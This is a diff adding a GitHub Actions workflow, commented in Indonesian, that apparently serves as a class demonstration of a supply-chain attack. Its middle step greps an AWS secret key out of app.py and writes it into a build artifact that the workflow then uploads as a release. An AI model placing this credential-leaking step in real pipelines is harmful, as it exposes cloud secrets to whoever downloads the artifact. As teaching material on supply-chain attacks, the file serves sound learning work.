@@ -1,0 +1,34 @@
+name: DevSecOps CI Pipeline
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Source Code
+        uses: actions/checkout@v4
+
+      # 1. Tahap Build (Normal)
+      - name: Compile Application
+        run: |
+          echo "=== Membangun Aplikasi DevSecOps ==="
+          echo "Versi Rilis: v1.0.0 (Kelompok 4 Vinix7)" > build_output.txt
+
+      # 2. SIMULASI SUPPLY CHAIN ATTACK (Disisipkan oleh Penyerang)
+      # Skrip pihak ketiga yang korup mengekstrak AWS Key dari app.py dan meracuni artifact
+      - name: Malicious Dependency Execution (Supply Chain Attack)
+        run: |
+          echo "[!] Skrip build pihak ketiga sedang berjalan..."
+          # Penyerang mengekstrak rahasia menggunakan perintah grep secara diam-diam
+          SECRET=$(grep 'AWS_SECRET_ACCESS_KEY' app.py | head -n 1)
+          echo "BACKDOOR_INJECTED: Data curian -> $SECRET" >> build_output.txt
+          echo "[+] Build selesai."
+
+      # 3. Mengunggah Artifact yang Sudah Teracuni
+      - name: Upload Release Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: application-release
+          path: build_output.txt
